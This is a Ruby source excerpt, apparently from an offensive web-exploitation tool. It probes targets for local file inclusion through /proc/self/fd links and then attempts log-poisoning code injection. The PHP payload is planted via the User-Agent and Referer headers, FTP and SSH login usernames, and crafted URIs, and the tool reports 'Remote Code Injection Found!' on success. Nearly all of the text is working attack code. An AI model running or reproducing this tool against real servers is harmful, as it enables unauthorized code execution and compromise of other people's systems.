  def fd(link, postdata=nil, starts=0, ends=32)
    if @os == 'Windows'
      print_error("Your target appears to be Winblows!")
      print_error("This option is only available for some Linux based targets!")
    else
      print_status("Searching for Log Files available via /proc/self/fd/ links....")
      vuln=false
      while(true)
        starts.upto(ends) do |num|
          if @min.to_i == 0
            test = "/proc/self/fd/#{num}"
          else
            test = "#{@stepstone}proc/self/fd/#{num}"
          end
          print_status("Testing: #{test}")
          if postdata.nil? #GET
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
            vuln=true if basic(testlink)
          else #POST
           testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
            vuln=true if basic(link, testlink)
          end
          if vuln
            vuln=false
            if @ua
              print_status("Testing Code Injection via User-Agent Header......")
              oldua=$config['HTTP']['HTTP_USER_AGENT']
              @rnd = randz(5)
              $config['HTTP']['HTTP_USER_AGENT'] = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
              if postdata.nil? #GET
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                if basic(testlink) and not @resultz.nil?
                  vuln=true
                  print_status("GET: #{testlink}")
                  print_status("User-Agent Header: #{$config['HTTP']['HTTP_USER_AGENT']}")
                end
              else #POST
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                vuln=true if basic(link, testlink)
                if basic(testlink) and not @resultz.nil?
                  vuln=true
                  print_status("POST: #{link}")
                  print_status("DATA: #{testlink}")
                  print_status("User-Agent Header: #{$config['HTTP']['HTTP_USER_AGENT']}")
                end
              end
              $config['HTTP']['HTTP_USER_AGENT']=oldua
              if vuln
                print_good("Remote Code Injection Found!")
                print_good("#{@resultz} :)")
              else
                print_error("User-Agent Based Injection Not Working!")
                print_error("Always best to check manually to confirm, sorry....")
              end
            end
            if not vuln and @ref
              print_status("Testing Code Injection via Referer Header......")
              @rnd = randz(5)
              payload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
              # Add custom headers for Accept Injection
              $config['HTTP']['HTTP_HEADERS_ADD']=true
              $config['HTTP']['HTTP_HEADERS'].store("Referer", payload)
              if postdata.nil? #GET
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                if basic(testlink) and not @resultz.nil?
                  vuln=true
                  print_status("GET: #{testlink}")
                  print_status("Referer Header: #{payload}")
                end
              else #POST
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                if basic(link, testlink) and not @resultz.nil?
                  vuln=true 
                  print_status("POST: #{link}")
                  print_status("DATA: #{testlink}")
                  print_status("Referer Header: #{payload}")
                end
              end
              $config['HTTP']['HTTP_HEADERS_ADD']=false
              if vuln
                print_good("Remote Code Injection Found!")
                print_good("#{@resultz} :)")
              else
                print_error("Referer Header Based Injection Not Working!")
                print_error("Always best to check manually to confirm, sorry....")
              end
            end
            if not vuln and @loginlog
              @rnd = randz(5)
              payload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
              while(true)
                print_caution("Select Injection Method: ")
                print_caution("1) FTP Login Based Injection")
                print_caution("2) SSH Login Based Injection")
                method = Readline.readline("(Continue Search for more Logs (Y/N)?)> ", true)
                if method.chomp.to_i == 1
                  meth='FTP'
                  print_status("Testing FTP Username Login Based Code Injection......")
                  host=link.sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
                  begin
                    ftp = Net::FTP.new(host) #ftp object to target
                    ftp.login(payload, 'fooFucked') #inject via username field as it shows in most ftp log files
                    ftp.close #close connect as we dont care or need anything
                  rescue
                    print_good("Error Triggered, hope it works!")
                  end
                  break
                elsif method.chomp.to_i == 2
                  meth='SSH'
                  print_status("Testing SSH Login Based Code Injection......")
                  begin 
                    # Trigger injection via SSH username field....
                    ssh = Net::SSH.start(host, payload, :password => 'fooFucked')
                    foofucked = ssh.exec!('ls') # We will never make it here :p
                    ssh.close if ssh
                  rescue
                    print_good("Error Triggered, hope it works!")
                  end
                  break
                else
                  print_line("")
                  print_error("Oops, Didn't quite understand that one")
                  print_error("Please Choose a Valid Option From Menu Below Next Time.....")
                  print_line("")
                end
              end
              if postdata.nil? #GET
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                vuln=true if basic(testlink) and not @resultz.nil?
              else #POST
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                vuln=true if basic(link, testlink) and not @resultz.nil?
              end
              if vuln
                print_good("Remote Code Injection Found!")
                print_good("#{@resultz} :)")
              else
                print_error("#{meth} Username Login Based Injection Not Working!")
                print_error("Always best to check manually to confirm, sorry....")
              end
            end
            if not vuln
              print_status("Testing URI Based Code Injection......")
              @rnd = randz(5)
              payload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
              foofuck = randz(15)
              foopath = foofuck + payload
              foofucked = 'http://' + link.sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0] + foopath
              rez = @http.get(foofucked)
              if rez[1] == 200
                print_error("WTF - somehow we received 200 response, not sure this is going to work")
              end
              if postdata.nil? #GET
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                if basic(testlink) and not @resultz.nil?
                  vuln=true
                  print_status("GET: #{testlink}")
                end
              else #POST
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
                testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
                if basic(link, testlink) and not @resultz.nil?
                  vuln=true 
                  print_status("POST: #{link}")
                  print_status("DATA: #{testlink}")
                end
              end
              if vuln
                print_good("Remote Code Injection Found!")
                print_good("#{@resultz} :)")
              else
                print_error("URI Based Injection Not Working!")
                print_error("Always best to check manually to confirm, sorry....")
              end
            end
          end
        end
        break
      end
    end
  end
end # End of Includer Class
